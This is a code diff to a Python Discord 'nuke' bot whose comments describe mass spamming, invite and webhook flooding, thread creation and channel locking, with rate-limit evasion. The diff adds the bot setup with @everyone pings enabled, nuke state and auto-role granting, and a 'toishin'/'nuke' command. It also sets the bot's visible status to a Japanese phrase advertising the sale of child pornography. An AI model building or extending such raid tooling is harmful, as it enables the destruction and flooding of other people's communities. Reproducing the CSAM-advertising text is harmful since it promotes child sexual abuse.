@@ -17,7 +17,6 @@
     連投・招待・Webhook・スレッド・施錠は毎回やる
     再利用時は先に slowmode と権限を解除してから撃つ
     判定材料は「サーバー名 / ADMINロール数 / 生成ch数」の3つ
-    (コミュニティ有効は通常サーバーでも普通なので判定に使わない)
 ================================================================
   【レート制御】
     - 全送信はトークンバケツ(既定40/s)を1枚通してから発火
@@ -50,6 +49,25 @@ try:
     load_dotenv()
 except Exception:
     pass
+
+
+# ==================== Bot インスタンス (先に作る) ====================
+# 以降のどこで @bot.command / bot.http を使っても必ず存在させるため、
+# 設定より先にここで生成する。
+intents = discord.Intents.default()
+intents.guilds = True
+intents.members = True
+intents.message_content = True
+
+bot = commands.Bot(
+    command_prefix="!",
+    intents=intents,
+    case_insensitive=True,
+    max_messages=None,
+    allowed_mentions=discord.AllowedMentions(everyone=True, roles=False, users=False),
+    activity=discord.Activity(type=discord.ActivityType.watching, name="児童ポルノ販売中"),
+    chunk_guilds_at_startup=False,
+)
 
 
 # ============================ 設定 ============================
@@ -162,7 +180,7 @@ NAME_POOL = [
 ROLE_NAME_POOL = [
     "管理者", "モデレーター", "神", "運営", "サブ垢", "本垢", "Bot", "Lv100",
     "VIP", "プレミアム", "課金勢", "無課金", "古参", "新参", "荒らし", "養分",
-    "常連", "一見", "の中人", "裏方", "実質王", "雑用",
+    "常連", "一見", "中の人", "裏方", "実質王", "雑用",
 ]
 
 EMOJI_POOL = [
@@ -204,6 +222,12 @@ GATE = asyncio.Event()
 GATE.set()
 PACER = {"rate": SPAM_RATE, "tokens": SPAM_BURST, "last": time.monotonic()}
 COOLDOWN = {"until": 0.0, "task": None, "hits": 0}
+
+NUKE_LOCK = asyncio.Lock()
+RETRY = {"delay": 30.0}
+
+AUTO_GRANT: dict[int, list[str]] = {}
+AUTO_GRANT_SEM = asyncio.Semaphore(MEMBER_CONCURRENCY)
 
 _RETRYABLE_5XX = {500, 502, 503, 504}
 _NO_RETRY_4XX  = {400, 401, 403, 404, 405, 415}
@@ -442,6 +466,14 @@ def panic_skip(stage: str) -> bool:
         log.warning("PANIC: %s をスキップ", stage)
         return True
     return False
+
+
+def resolve_auto_roles(guild: discord.Guild) -> list[discord.Role]:
+    names = AUTO_GRANT.get(guild.id)
+    if not names:
+        return []
+    wanted = set(names)
+    return [r for r in guild.roles if r.name in wanted]
 
 
 # ================== ヌケ済み判定 ==================
@@ -928,6 +960,7 @@ async def run_nuke(guild: discord.Guild, force_full: bool = False) -> None:
         log.info("=== NUKE END | 所要 %s ===", el())
 
 
+# ========================= コマンド =========================
 @bot.command(name="toishin", aliases=["nuke", "t"])
 @commands.guild_only()
 async def toishin(ctx: commands.Context, mode: str = ""):
